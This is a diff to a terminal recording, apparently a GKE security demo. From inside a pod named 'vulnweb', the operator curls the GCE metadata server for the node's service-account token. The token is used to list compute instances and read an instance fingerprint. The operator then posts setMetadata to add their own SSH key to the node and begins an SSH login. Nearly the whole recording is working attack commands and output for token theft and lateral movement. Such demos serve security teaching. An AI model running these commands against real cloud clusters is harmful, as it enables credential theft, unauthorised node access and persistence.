@@ -11,111 +11,15 @@
   },
   "stdout": [
     [
-      0.309715,
-      "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
-    ],
-    [
-      0.627675,
-      "kubectl exe"
-    ],
-    [
-      4.9e-05,
-      "c -it vu"
-    ],
-    [
-      2.6e-05,
-      "lnw"
-    ],
-    [
-      2.6e-05,
-      "eb"
-    ],
-    [
-      0.000102,
-      "-"
-    ],
-    [
-      5.1e-05,
-      "256994"
-    ],
-    [
-      3.2e-05,
-      "14"
-    ],
-    [
-      0.000151,
-      "0"
-    ],
-    [
-      0.000119,
-      "5-qgpg1 "
-    ],
-    [
-      7.8e-05,
-      "/b"
-    ],
-    [
-      3.1e-05,
-      "in"
-    ],
-    [
-      2.6e-05,
-      "/"
-    ],
-    [
-      1.7e-05,
-      "b"
-    ],
-    [
-      6.8e-05,
-      "a"
-    ],
-    [
-      3.1e-05,
-      "sh\r\n"
-    ],
-    [
-      0.887661,
+      0.007661,
       "root@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      0.000824,
-      "export TERM=xterm\r\nroot@vulnweb-2569941405-qgpg1:/# clear"
-    ],
-    [
-      0.4315,
-      "\r\u001b[Kroot@vulnweb-2569941405-qgpg1:/# clear\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
-    ],
-    [
-      0.348553,
-      "c"
-    ],
-    [
-      0.07929,
-      "l"
-    ],
-    [
-      0.190836,
-      "e"
-    ],
-    [
-      0.135992,
-      "a"
-    ],
-    [
-      0.06699,
-      "r"
-    ],
-    [
-      0.157652,
-      "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
-    ],
-    [
-      2.0,
+      0.3,
       "curl -s -H \"X-Google-Metadata-Request: True\" http://metad \rata.google.internal/0.1/meta-data/network"
     ],
     [
-      1.649259,
+      3.0,
       "\r\n"
     ],
     [
@@ -127,7 +31,7 @@
       "root@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
+      1.0,
       "curl -s -H \"Metadata-Flavor: Google\" -H \"Authorization\":\" \rBearer $(curl -s \"http://metadata.google.internal/computeMetadata/v1/instance/service-acco \runts/default/token\" -H \"Metadata-Flavor: Google\" | awk -F\\\" '{prin"
     ],
     [
@@ -143,7 +47,7 @@
       "/projects/gkek8s-178117/zones/us-east1 \r-b/instances"
     ],
     [
-      1.792209,
+      3.0,
       "\r\n"
     ],
     [
@@ -367,7 +271,7 @@
       "aswell\",\r\n   \"labels\": {\r\n    \"goog-gke-node\": \"\"\r\n   },\r\n   \"labelFingerprint\": \"2ixRno2sGuM=\",\r\n   \"startRestricted\": false,\r\n   \"deletionProtection\": false\r\n  }\r\n ],\r\n \"selfLink\": \"https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances\"\r\n}\r\nroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
+      1.0,
       "curl -s -H \"Metadata-Flavor: Google\" -H \"Authorization\":\"B\rBearer $(curl -s \"http://metadata.google.internal/computeMetadata/v1/instance/service-accou\runts/default/token\" -H \"Metadata-Flavor: Google\" | awk -F\\\" '{print $4}')\" -H \"Accept: appl\rlication/json\" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-\r-b/instances"
     ],
     [
@@ -399,7 +303,7 @@
       "s"
     ],
     [
-      0.09255,
+      2.09255,
       "\r\n\u001b[?1049h\u001b[?1h\u001b=\r"
     ],
     [
@@ -1859,7 +1763,7 @@
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
+      1.0,
       "curl -s -H \"Metadata-Flavor: Google\" -H \"Authorization\":\" \rBearer $(curl -s \"http://metadata.google.internal/computeMetadata/v1/instance/service-acco \runts/default/token\" -H \"Metadata-Flavor: Google\" | awk"
     ],
     [
@@ -1871,7 +1775,7 @@
       "-F\\\" '{print $4}')\" -H \"Accept: app \rlication/json\" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1 \r-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc | less"
     ],
     [
-      0.676643,
+      2.676643,
       "\r\n\u001b[?1049h\u001b[?1h\u001b=\r"
     ],
     [
@@ -2139,7 +2043,7 @@
       "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
+      1.0,
       "export FINGERPRINT=$(curl -s -H \"Metadata-Flavor: Google\" \r -H \"Authorization\":\"Bearer $(curl -s \"http://metadata.google.internal/computeMetadata/v1/ \rinstance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\" | awk -F\\\" '{print $ \r4}')\" -H \"Accept: application/json\" "
     ],
     [
@@ -2151,7 +2055,7 @@
       "tps://www.googleapis.com/compute/v1/projects/gkek8s- \r178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc | grep fing \rer | tail -1 | cut -d'\"' -f4)"
     ],
     [
-      1.211249,
+      3.211249,
       "\r\n"
     ],
     [
@@ -2255,7 +2159,7 @@
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
+      1.0,
       "cat > metadata << EOF\r\n> {\r\n>   \"fingerprint\": \"$FINGERPRINT\",\r\n>   \"items\": [\r\n>    {\r\n>     \"key\": \"sshKeys\",\r\n>     \"value\": \"geese:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYNealSvTy/g9aHyHTKe0xy2WIVmKP \rBqXVxmWyPObqfZJd0tWOw2JKoWb2m7V69haSa57SxF2f3Aap70BHhi+TjW//ZNHzE8jFyS/vf9e3CNSfFXlNY25cVb \rPc+b"
     ],
     [
@@ -2283,7 +2187,7 @@
       "RtMeA/h5opdNMJlISZnVy5gQDwIaYRY73 \rG+oWTh0cVH0cHRGhKYkIB+t8RHNyDA+EkLEObicbRF\"\r\n>    }\r\n>   ]\r\n> }\r\n> \r\n> EOF"
     ],
     [
-      1.050277,
+      3.050277,
       "\r\n"
     ],
     [
@@ -2371,15 +2275,11 @@
       "\r\n{\r\n  \"fingerprint\": \"unGNa8J40OI=\",\r\n  \"items\": [\r\n   {\r\n    \"key\": \"sshKeys\",\r\n    \"value\": \"geese:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYNealSvTy/g9aHyHTKe0xy2WIVmKPBqXVxmWyPObqfZJd0tWOw2JKoWb2m7V69haSa57SxF2f3Aap70BHhi+TjW//ZNHzE8jFyS/vf9e3CNSfFXlNY25cVbPc+b+EXl+pf96ubIt4WtnsoxuoZN06nC3UHeAWXIh8XJ6TakqjyTzy612ZmDQQuQ9qDjPaeGbJbzDytYdSxuSl5mTlG4hu87VsZlPHXXISfE7RPNSLQ3Kc+hfJkgEtGY/CexkIPgJTJBaI7znUyRtMeA/h5opdNMJlISZnVy5gQDwIaYRY73G+oWTh0cVH0cHRGhKYkIB+t8RHNyDA+EkLEObicbRF\"\r\n   }\r\n  ]\r\n}\r\n\r\nroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
-      "cu"
+      3.0,
+      "curl -X POST -d \"@metadata\" -s -H \"Metadata-Flavor: Googl \re\" -H \"Authorization\":\"Bearer $(curl -s \"http://metadata.google.internal/computeMetadata/v \r1/instance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\" | awk -F\\\" '{print \r $4}')\" -H \"Content-type: application/json\" https://www.googleapis.com/compute/v1/projects \r/gkek8s-178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc/set \rMetadata"
     ],
     [
-      0.025307,
-      "rl -X POST -d \"@metadata\" -s -H \"Metadata-Flavor: Googl \re\" -H \"Authorization\":\"Bearer $(curl -s \"http://metadata.google.internal/computeMetadata/v \r1/instance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\" | awk -F\\\" '{print \r $4}')\" -H \"Content-type: application/json\" https://www.googleapis.com/compute/v1/projects \r/gkek8s-178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc/set \rMetadata"
-    ],
-    [
-      2.0,
+      3.0,
       "\r\n"
     ],
     [
@@ -2419,7 +2319,7 @@
       "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
     ],
     [
-      2.0,
+      1.0,
       "ssh"
     ],
     [
@@ -2511,7 +2411,7 @@
       "The authenticity of host '35.185.32.11 (35.185.32.11)' can't be established.\r\nRSA key fingerprint is SHA256:EMVzNVLV+L5Ef77JapZSu8lHCDIkiaCrT62kCY2hiww.\r\nAre you sure you want to continue connecting (yes/no)? "
     ],
     [
-      0.707906,
+      0.207906,
       "y"
     ],
     [
